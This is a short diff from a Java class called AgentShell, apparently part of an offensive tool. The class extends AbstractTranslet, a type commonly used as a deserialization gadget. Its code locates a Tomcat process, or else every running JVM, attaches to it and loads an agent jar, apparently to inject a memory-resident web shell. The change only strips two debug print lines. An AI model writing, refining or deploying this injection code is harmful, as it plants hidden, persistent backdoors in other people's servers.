@@ -42,13 +42,11 @@ public class AgentShell extends AbstractTranslet {
                 pid = AgentShell.getTomcatPid2();
             }
             if (pid != null){
-                System.out.println(pid);
                 vm = attachMethod.invoke(null, pid);
                 loadAgentMethod.invoke(vm,AgentShell.jarPath);
             }else {
                 List<String> allId = AgentShell.getAllId();
                 for (String id : allId){
-                    System.out.println(pid);
                     try {
                         vm = attachMethod.invoke(null, id);
                         loadAgentMethod.invoke(vm,AgentShell.jarPath);
